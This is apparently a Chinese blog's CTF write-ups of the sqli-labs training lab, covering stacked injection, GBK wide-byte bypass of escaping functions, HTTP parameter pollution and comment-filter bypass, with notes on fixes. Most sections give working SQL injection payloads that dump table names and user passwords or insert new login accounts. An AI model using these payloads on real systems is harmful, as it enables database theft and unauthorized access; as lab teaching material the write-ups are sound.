title="less-41基于BoolGET数字型盲注堆叠注入"></a>less-41基于BoolGET数字型盲注堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181918987.png" alt="image-20220318191828896"></p><pre><code>?id=1;insert into users values(41,&#39;Less41&#39;,&#39;hello&#39;)--+</code></pre><h2 id="less-42基于存储POST单引号字符型堆叠注入"><a href="#less-42基于存储POST单引号字符型堆叠注入" class="headerlink" title="less-42基于存储POST单引号字符型堆叠注入"></a>less-42基于存储POST单引号字符型堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181919573.png" alt="image-20220318191945474"></p><p>这关看起来和less-24是一样的界面,但是实际上是有不同的,我们点击新建一个用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181923487.png" alt="image-20220318192312399"></p><p>需要进行创建用户再进行侵入</p><pre><code>1&#39;;insert into users(id,username,password) values(42,&#39;Less42&#39;,&#39;Less42&#39;)#</code></pre><p>成功使用新建的用户登录进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181928433.png" alt="image-20220318192800345"></p><h2 id="less-43基于存储POST单引号小括号字符型堆叠注入"><a href="#less-43基于存储POST单引号小括号字符型堆叠注入" class="headerlink" title="less-43基于存储POST单引号小括号字符型堆叠注入"></a>less-43基于存储POST单引号小括号字符型堆叠注入</h2><p>本关与 42 关的原理基本一致，我们还是定位在 login.php 中的 password。看一下 sql 语句为:</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181931983.png" alt="image-20220318193155911"></p><pre><code>1&#39;);insert into users values(43,&#39;Less43&#39;,&#39;Less43&#39;)#</code></pre><h2 id="Less-44基于存储POST单引号字符型盲注堆叠注入"><a href="#Less-44基于存储POST单引号字符型盲注堆叠注入" class="headerlink" title="Less-44基于存储POST单引号字符型盲注堆叠注入"></a>Less-44基于存储POST单引号字符型盲注堆叠注入</h2><p>本关是基于盲注的，这里盲注主要是要没有报错信息，所以要采用盲注。这关与 42 关的区  别就在于没有报错信息，当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件</p><pre><code>login_user=admin&amp;login_password=1 or 1=1--+login_user=admin&amp;login_password=1&#39; or 1=1--+login_user=admin&amp;login_password=1&quot; or 1=1--+login_user=admin&amp;login_password=1&#39;) or 1=1--+login_user=admin&amp;login_password=1&quot;) or 1=1--+</code></pre><pre><code>1&#39;;insert into users values (&#39;44&#39;,&#39;less44&#39;,&#39;hello&#39;)#</code></pre><h2 id="less-45基于存储POST单引号小括号字符型盲注堆叠注入"><a href="#less-45基于存储POST单引号小括号字符型盲注堆叠注入" class="headerlink" title="less-45基于存储POST单引号小括号字符型盲注堆叠注入"></a>less-45基于存储POST单引号小括号字符型盲注堆叠注入</h2><p>45 关与 43 关的 payload 是一样的，只不过 45 关依旧没有报错信息。</p><pre><code>1&#39;);insert into users(id,username,password) values(45,&#39;Less45&#39;,&#39;Less45&#39;)#</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>slilabs靶场记录宽字节绕过(七)</title>
      <link href="/ctf/sql/sql-slilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87(%E4%B8%83)/"/>
      <url>/ctf/sql/sql-slilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87(%E4%B8%83)/</url>
      
        <content type="html"><![CDATA[<h1 id="slilabs靶场记录宽字节绕过-七"><a href="#slilabs靶场记录宽字节绕过-七" class="headerlink" title="slilabs靶场记录宽字节绕过(七)"></a>slilabs靶场记录宽字节绕过(七)</h1><h2 id="宽字节注入的了解"><a href="#宽字节注入的了解" class="headerlink" title="宽字节注入的了解"></a>宽字节注入的了解</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mysql在使用GBK编码的时候会认为两个字符为一个汉字,例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围).我们在过滤’时,往往利用的思路是将’转换为&#39;</p><p>php自带了一些转义特殊字符的函数,如addslanshes(),mysql_real_escape_string(),mysql_escape_string()等,这些函数可以用来防止sql注入</p><p>如id&#x3D;1’or’1’&#x3D;’1,单引号本来用来闭合语句,这些函数会自动转义这些闭合单引号,在这些单引号的前面加上转义字符,变为</p><pre><code>id=1\&#39;or\&#39;1\&#39;=\&#39;1</code></pre><p>如此在sql查询中是一个普通的字符串,不能进行注入.</p><ol><li><p>%bb吃掉\</p><p> 如果程序的默认字符集是gbk等宽字节字符集,就有可能产生宽字节注入,绕过上述的过滤.</p><p> 若php使用的mysql_query(“set name gbk”)将默认字符集设置为gbk,而使用addslashes()转义用户输入,这使如果用户输入%bb%27,则addslashes()会在%27前面加上一个%5c字符,即转义字符.而在mysql使用gbk编码时,会认为两个字符为一个汉字,%bb%5c是一个宽字符(前一个ascii码大于128才能到达汉字的范围)也就是籠,也就是说%bb%5c%27&#x3D;籠’.这样的话’就看见逃逸出来,也就是未被\进行转义从而造成闭合语句,产生sql注入.%bb并不是唯一一个可以产生宽字符注入的字符,理论上%81到%fe都可以</p></li><li><p>过滤<code>\&#39;</code>中的\</p><p> 构造%bb%5c%5c%27,addslashes()会两个%5c和%27前面都加上\就%5c,变为%bb %5c%5c %5c%5c %5c%27 ,但是宽字符集会认为%bb%5c 是一个字符即为籠,则变为 %bb%5c %5c%5c %27即为 <code>籠\\\\&#39;</code>,四个\正好转义为两个,即’未被转义.</p></li></ol><h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>常见字符集</p><ol><li>ascii编码:单字节编码</li><li>latin1编码:字符节编码</li><li>gbk编码:使用一字节和双字节编码,0x00 - 0x7f 范围内是一位,和ascii保持一致.双字节的第一字节范围是 0x81 - 0xfe</li><li>utf-8编码:是用一至四字节编码,0x00 - 0x7f范围内是第一位,和ascii保持一致.其他字符用二至四字节变长表示</li></ol><p>宽字节就是两个以上的字节,宽字节注入产生的原因就是各种字符编码的不当操作,使攻击者可以通过宽字节编码绕过sqk注入防御</p><p>通常来说,一个gbk编码汉字,占用两个字节.一个utf-8编码的汉字,占用3个字节.在php中,我们可以通过输出</p><pre><code>echo strlen(&quot;和&quot;);    #2     gbk编码时echo strlen(&quot;和&quot;);    #3    utf-8编码时</code></pre><p>处理gbk之外,所有的ansi编码都是2个字节.ansi只是一个标准,在不同的电脑上它代表的编码可能不相同,比如简体中文系统中ansi就是代表gbk</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>首先我们了解下宽字节注入,宽字节注入主要是源于程序员设置数据库编码与php编码这是为不同的两个编码那么就有可能产生宽字节注入</p><pre><code>数据提交到mysql数据库,需要进行字符集的转换,使得mysql数据库可以对数据进行处理,这一过程一般有以下三个步骤:    1.收到请求,将请求数据从character_set_client -&gt; character_set_coonection    2.内部操作,将数据从character_set_connection -&gt; 表创建字符集    3.结果输出,将数据从表创建的字符集 -&gt; character_set_results当执行set names &quot;字符集&quot;,相当于执行set character_set_client = 字符集set character_set_connection = 字符集set character_set_connection = 字符集client指的是php程序connection指的是php客户端与mysql服务器之间连接层results指的是mysql服务器返回给php客户端的结果mysql常见的乱码问题就是这三个字符集的设置不当所引起的</code></pre><p>宽字符是指两个字节宽度的编码技术，如UNICODE、GBK、BIG5等。当MYSQL数据库数据在处理和存储过程中，涉及到的字符集相关信息包括：</p><ol><li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li><li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li><li>character_set_database:数据库缺省编码字符集。</li><li>character_set_filesystem:文件系统编码字符集。</li><li>character_set_results:SQL语句执行结果编码字符集。</li><li>character_set_server:服务器缺省编码字符集。</li><li>character_set_system:系统缺省编码字符集。</li><li>character_sets_dir:字符集存放目录，一般不要修改。</li></ol><p>宽字节对转义字符的影响发生在character_set_client&#x3D;gbk的情况,也就是说如果客户端发送的数据字符集是gbk,则可能会吃掉转义字符,从而导致转义失败</p><p>例如说php的编码时utf-8而mysql的编码设置了set names ‘gbk’ 或者是 set character_set_client&#x3D;gbk,这样配置会引发编码转换从而导致注入漏洞</p><h3 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h3><pre><code>先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入.（也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）这就造成了编码过后转义引号的反斜杠即字符5c不会和字符df变成一个宽字符，阻止了df 和 5c 的拼接，于是防宽字符注入成功）这个方式是可行的，但有部分老的cms，在多处使用addslashes来过滤字符串，我们不可能去一个一个把addslashes都修改成mysql_real_escape_string。我们第二个解决方案就是，将character_set_client设置为binary（二进制）。只需在所有sql语句前指定一下连接的形式是二进制：mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); 这几个变量是什么意思？当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。所以，我们将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</code></pre><h2 id="less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入"><a href="#less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入" class="headerlink" title="less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入"></a>less-32基于错误GET单引号字符型转义引号反斜杠宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181313899.png" alt="image-20220318131351701"></p><p>可以看到这个check_addslashes()函数十个过滤 \ ‘ “ 的函数,分别在前面加上\</p><p>注意这里的mysql_query(“set name gbk”)</p><h3 id="确定宽字节注入"><a href="#确定宽字节注入" class="headerlink" title="确定宽字节注入"></a>确定宽字节注入</h3><pre><code>1    回显正常1&#39;    回显正常1&quot;    回显正常</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181319160.png" alt="image-20220318131931097"></p><p>这里可以发现在输入的’前面加上了 ‘    </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181320859.png" alt="image-20220318132011795"></p><p>双引号也有</p><h3 id="尝试宽字节注入"><a href="#尝试宽字节注入" class="headerlink" title="尝试宽字节注入"></a>尝试宽字节注入</h3><p><strong>1ß’</strong></p><pre><code>1ß&#39;        url编码后 1%df%27        </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181322433.png" alt="image-20220318132232359"></p><pre><code>1ß&quot;        url编码后 1%df%22</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181323920.png" alt="image-20220318132345854"></p><p>get型的方式我们是以url形式提交的,因此数据会通过url编码,其实url编码就是一个字符ascii码的16进制.不过稍微有些变动,需要在前面加上”%”.比如”<code>\</code>“,他的ascii码是92,92的十六进制是5c,所以”<code>\</code>“的url编码就是%5c.那么汉字的url编码呢?如”胡”的ascii码是-17670,十六进制是BAFA,url编码时%BAFA (汉字转ascii码默认情况下,是使用扩展ascii,第一个字节为负数是(或理解为127以上)是识别,后加一个字节总共两个字节)</p><p>这里可以看出是单引号闭合的宽字节注入</p><pre><code>1%df%27--+#</code></pre><p><strong><code>ß\\&#39;</code></strong></p><pre><code>1ß\\&#39;--+    url编码后    1%df%5c%5c%27--+    被addslashes后 %bb%5c %5c%5c %5c%5c %27 即籠\\\\&#39;</code></pre><p>闭合之后剩下的就很简单了</p><pre><code>爆库:-1%df%27 union select 1,2,database()--+爆表：-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+或者将security转换为16进制:-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+爆字段:user转换为16进制：0x7573657273-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+爆数据:-1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users--+或者-1%df%27 union select 1,group_concat(username,0x7e,password),3 from users--+</code></pre><h2 id="less-33GET型-绕过AddSlashes-函数"><a href="#less-33GET型-绕过AddSlashes-函数" class="headerlink" title="less-33GET型-绕过AddSlashes()函数"></a>less-33GET型-绕过AddSlashes()函数</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181339863.png" alt="image-20220318133927781"></p><p>注意这里mysql_query(“set names gbk”)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181340826.png" alt="image-20220318134027759"></p><p>check_addslashes()函数也有改变,此时并不是自定义的函数,而是直接使用PHP自带的addslashes函数</p><p>addslashes函数转义 ‘ “ \ NULL字符</p><p>注意:默认的,php对所有的get post cookie数据自动运行addslashes()  (请注意:这个是在之前版本开启魔术引号时才会有的，在新版本中这个魔术引号已经废弃了). 所以不应对已转义的字符串使用addslashes(),因为这样会导致双层转义,遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测</p><p>strupslashes()函数用于删除有addslashes()函数添加的反斜杠</p><pre><code>爆表:-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181346496.png" alt="image-20220318134654424"></p><pre><code>Notice：使用 addslashes(),我们需要将 mysql_query 设置为 binary （即二进制）的方式，才能防御此漏洞。Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</code></pre><p><strong>MySQL居然不区分大小</strong></p><p><strong>可以使用binary将字符串先转换为二进制字符串，在进行比较、</strong></p><pre><code>通过看MySQL手册可以知道，默认情况下，对MySQL数据库中的字段进行查询或者排序都是不区分大小写的。但是在有些应用中，需要进行区分大小写的操作，咋办？答：使用BINARY操作符。BINARY操作符将后面的字符串抛给一个二进制字符串。这是一种简单的方式来促使逐字节而不是逐字符的进行列比较。这使得比较区分大小写，即使该列不被定义为 BINARY或 BLOB。BINARY影响整个比较；它可以在任何操作数前被给定，而产生相同的结果。解决方法1、第一种是在创建表结构时候使用binary属性来定义字段：    create table if not exists user(        id int unsigned primary key auto_increment,        name varchar(32) binary,    )engine=myisam;或者在表结构创建好后使用alter来添加字段binary属性alter table user modify name varchar(32) binary ;2、第二种方法是在sql语句中使用bianry来进行区分大小写操作：    SELECT * FROM user where name=binary &#39;maratrix&#39;;    或者    SELECT * FROM user where binary name=&#39;maratrix&#39;;进过测试发现，使用SELECT * FROM user where name=binary &#39;maratrix&#39;;效率更高点，原因是将binary放在字符串前会使用索引（假设该字段存在索引），而将binary放在字段前面将不会使用索引，即使索引存在也不会使用。注意在一些语境中，假如你将一个编入索引的列派给BINARY, MySQL 将不能有效使用这个索引。</code></pre><h2 id="less-34基于错误POST单引号字符型addslashes-宽字节注入"><a href="#less-34基于错误POST单引号字符型addslashes-宽字节注入" class="headerlink" title="less-34基于错误POST单引号字符型addslashes()宽字节注入"></a>less-34基于错误POST单引号字符型addslashes()宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181353145.png" alt="image-20220318135353996"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181354633.png" alt="image-20220318135426534"></p><p>这一关是POST型注入,同样的将post传递进来的内容进行了转义处理,过滤了单引号,反斜杠.有之前的get请求的例子我们可以看到%df可以将转义的反斜杠给吃掉.而get型的方式我们是以url形式进行提交的,因此数据会通过urlencode,如何将方法用在post型中呢</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>这里基本上和get无差别,在less-32中使用%bb%27 或者 %bb%5c%5c%27代替’均可</p><pre><code>爆数据库:uname=1%bb%27 union select 1,database() #&amp;passwd=1</code></pre><h3 id="编码转换注入"><a href="#编码转换注入" class="headerlink" title="编码转换注入"></a>编码转换注入</h3><p>将 UTF-8 的<code>&#39;</code>转换为 UTF-16 的<code>�&#39;</code>实现注入的方法。这个字符我也不知道是什么</p><pre><code>爆数据库:uname=1�&#39; union select 1,database() #&amp;passwd=1</code></pre><h2 id="less-35基于错误GET数字型addslashes-宽字节注入"><a href="#less-35基于错误GET数字型addslashes-宽字节注入" class="headerlink" title="less-35基于错误GET数字型addslashes()宽字节注入"></a>less-35基于错误GET数字型addslashes()宽字节注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181412390.png" alt="image-20220318141219233"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181413371.png" alt="image-20220318141324275"></p><pre><code>id=1&#39;    version for the right syntax to use near &#39;\&#39; LIMIT 0,1&#39; at line 1id=1&quot;    version for the right syntax to use near &#39;\&quot; LIMIT 0,1&#39; at line 1</code></pre><p>这关有错误回显,比较简单可以判断出是数字型.</p><pre><code>那么在没有错误回显时,应当如何去判断是数字型还是引号被过滤呢?在能分辨出正确回显和错误回显(有固定字符串)时,id=1正确回显,尝试id=1&#39;和id=1&quot;    若两者都正确回显:很可能是被过滤引号    若两者都错误回显:很可能是数字型查询    若一正确一错误:基本可以确定是字符型查询</code></pre><p>我们知道了数字型并且知道了使用addslashes()函数,那么剩下的其实就比较简单了,就是有一点点小的改动,就是如果注入语句出现的引号里面的数据需要转换为十六进制.</p><pre><code>爆库:-1 union select 1,2,database()--+爆表:-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+爆字段:-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+爆数据:</code></pre><p>请注意:security转换为十六进制为0x7365637572697479是不包括引号的,转换为十六进制也不需要引号</p><h2 id="less-36GET-绕过-Mysql-real-escape-string-函数"><a href="#less-36GET-绕过-Mysql-real-escape-string-函数" class="headerlink" title="less-36GET-绕过 Mysql_real_escape_string 函数"></a>less-36GET-绕过 Mysql_real_escape_string 函数</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181424749.png" alt="image-20220318142440603"></p><pre><code>mysql_real_escape_string()函数转义的特殊字符 \x00 \n \r \ &#39; &quot; \x1a本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于mysql_query()，可使用本函数来预防数据库攻击</code></pre><pre><code>addslashes()能被宽字节注入的原因就是，它先进行转义，再进行GBK编码。    原理    对于宽字节编码，有一种最好的修补就是：    （1）使用mysql_set_charset(GBK)指定字符集    （2）使用mysql_real_escape_string进行转义    原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面df 和 5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？    就是使用mysql_set_charset进行指定。    上述的两个条件是“与”运算的关系，少一条都不行。</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181807608.png" alt="image-20220318180735490"></p><p>可以发现这里是先进行了对id参数先进行了转义,在进行gbk编码,这就造成了宽字节注入</p><pre><code>爆位置:0%bb%5c%5c%27 union select 1,2,3-- #爆数据库:-1%E6&#39; union select 1,2,database()--+爆表:-1%E6&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+爆列名:-1%E6&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+爆值:-1%E6&#39; union select 1,group_concat(username,0x7e,password),3 from security.users --+</code></pre><h2 id="less-37POST型-绕过-MYSQL-real-escape-string"><a href="#less-37POST型-绕过-MYSQL-real-escape-string" class="headerlink" title="less-37POST型 - 绕过 MYSQL_real_escape_string"></a>less-37POST型 - 绕过 MYSQL_real_escape_string</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181828809.png" alt="image-20220318182809707"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181828014.png" alt="image-20220318182858928"></p><p>可见基本一致直接绕过就可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181832301.png" alt="image-20220318183210210"></p><pre><code>爆位置:uname=-admin%E3&#39; union select 1,2 --+&amp;passwd=admin&amp;submit=Submit 爆表: uname=-admin%E3&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&amp;passwd=admin&amp;submit=Submit暴字段:uname=-admin%E3&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+&amp;passwd=admin&amp;submit=Submit暴值:uname=-admin%E3&#39; union select 1,group_concat(username,0x3a,password) from users --+&amp;passwd=admin&amp;submit=Submit</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录双服务器(六)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%8F%8C%E6%9C%8D%E5%8A%A1%E5%99%A8(%E5%85%AD)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%8F%8C%E6%9C%8D%E5%8A%A1%E5%99%A8(%E5%85%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录双服务器-六"><a href="#sqlilabs靶场记录双服务器-六" class="headerlink" title="sqlilabs靶场记录双服务器(六)"></a>sqlilabs靶场记录双服务器(六)</h1><h2 id="搭建双服务器Tomcat和Apache"><a href="#搭建双服务器Tomcat和Apache" class="headerlink" title="搭建双服务器Tomcat和Apache"></a>搭建双服务器Tomcat和Apache</h2><p>由于第29，30，31关需要双服务器环境，即Tomcat和Apache。这里以win2003为环境，利用JSP和PHPStudy来搭建服务器，由于我们已经在PHPStudy上搭建好了Apache服务器，现在只需要在JSP上搭建Tomcat即可。<br>首先下载JSP</p><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p>sqli-labs文件夹下面还有tomcat文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172211328.png" alt="image-20220317221150218"></p><p>解压放到JSPstudy的www目录下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172212735.png" alt="image-20220317221215602"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172212581.png" alt="image-20220317221228439"></p><p>需要改文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172213600.png" alt="image-20220317221327425"></p><p>改两处,改成自己的配置,接着改30和31关</p><h2 id="less-29基于错误GET双服务器单引号字符型注入"><a href="#less-29基于错误GET双服务器单引号字符型注入" class="headerlink" title="less-29基于错误GET双服务器单引号字符型注入"></a>less-29基于错误GET双服务器单引号字符型注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172216081.png" alt="image-20220317221639853"></p><p>服务器双层架构</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172216720.png" alt="image-20220317221650564"></p><p>服务器端有两个部分,第一部分是Tomcat为引擎的jsp型服务器,第二部分为apache为引擎的php服务器,真正提供web服务的是php服务器</p><p>工作流程为:client访问服务器,能直接访问到Tomcat服务器,然后tomcat服务器在向Apache服务器请求数据,数据返回路径刚好相反</p><p>参数解析问题</p><pre><code>index.php?id=1&amp;id=2,这个时候是回显id=1还是id=2呢?答:apache(php)解析最后一个参数,即回显id=2;而tomcat(jsp)解析第一个参数,即回显id=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172222840.png" alt="image-20220317222232693"></p><pre><code>index.jsp?id=1&amp;id=2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 答:tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？此处应该还是id=2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&amp;id=0 or 1=1--+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1--+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</code></pre><p>注入测试</p><pre><code>http://10.184.39.243:8080/sqlilabs/Less-29/?id=1    回显正常http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&#39;    </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172226113.png" alt="image-20220317222614870"></p><p>点击返回</p><p>从跳转到.jsp页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。</p><p>注入点测试</p><pre><code>http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&amp;id=1    回显正常</code></pre><pre><code>http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&amp;id=1&#39;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172228666.png" alt="image-20220317222802546"></p><p>有正确回显和错误回显，单引号无小括号，剩下的事就好办了，可以发现没有其他任何的过滤条件，是最简单的注入之一。</p><h2 id="less-30基于错误GET双服务器双引号字符型盲注"><a href="#less-30基于错误GET双服务器双引号字符型盲注" class="headerlink" title="less-30基于错误GET双服务器双引号字符型盲注"></a>less-30基于错误GET双服务器双引号字符型盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172231783.png" alt="image-20220317223127563"></p><p>有正确回显但无错误回显,所以可以盲注，延时注入，联合注入</p><h2 id="less-31基于错误GET双服务器双引号小括号字符型注入"><a href="#less-31基于错误GET双服务器双引号小括号字符型注入" class="headerlink" title="less-31基于错误GET双服务器双引号小括号字符型注入"></a>less-31基于错误GET双服务器双引号小括号字符型注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172233128.png" alt="image-20220317223320955"></p><p>和前面的做法一样，只不过这里是小括号+双引号闭合罢了</p><p>从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有<br>很多，不仅仅是我们上述列出过 WAF 一个方面，还有可以执行重复操作，可以执行非法操<br>作等。同时针对 WAF 的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关 HPP 的方法<br>需要共同去研究。这也是一个新的方向。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录中级关(五)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%BA%A7%E5%85%B3(%E4%BA%94)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%BA%A7%E5%85%B3(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录中级关-五"><a href="#sqlilabs靶场记录中级关-五" class="headerlink" title="sqlilabs靶场记录中级关(五)"></a>sqlilabs靶场记录中级关(五)</h1><h2 id="less-23基于错误的，过滤注释的GET型"><a href="#less-23基于错误的，过滤注释的GET型" class="headerlink" title="less-23基于错误的，过滤注释的GET型"></a>less-23基于错误的，过滤注释的GET型</h2><p>显然根据提示会过滤注释符,先把之前语句试一下</p><pre><code>id=1    正常id=1&#39;     version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 id=1&quot;    正常</code></pre><p>试着闭合一下</p><pre><code>id=1&#39; or 1=1-- # 报错id=1&#39; or 1=1--+  报错id=1&#39; or 1=1#     报错id=1&#39; or 1=1%23</code></pre><p>显然注释符闭合不了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171619714.png" alt="image-20220317161901626"></p><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></pre><p>那么我们试着闭合一下</p><pre><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4 and &#39;1&#39;=&#39;1&#39; LIMIT 0,11&#39; order by 4 and &#39;1&#39;=&#39;1或者SELECT * FROM users WHERE id=&#39;1&#39; order by &#39;4&#39; LIMIT 0,11&#39; order by &#39;4</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171626164.png" alt="image-20220317162609043"></p><p>请注意,这里的字段数为4是不正确的,因为我们知道,数据库里面的字段数是3.</p><p>那么这里并没有报错是因为什么原因呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171628619.png" alt="image-20220317162812522"></p><pre><code>where 与 order by 都是子句,and是操作符,用于where子句中在mysql执行的顺序中,where是远在order by 之前的order by 在where 的条件中,在where执行时被忽略了,结果集生成后并未在执行order by </code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171632831.png" alt="image-20220317163248748"></p><pre><code>从上面的操作中，我们推断出第一个操作中没有报错，说明order by语句没有执行是因为order 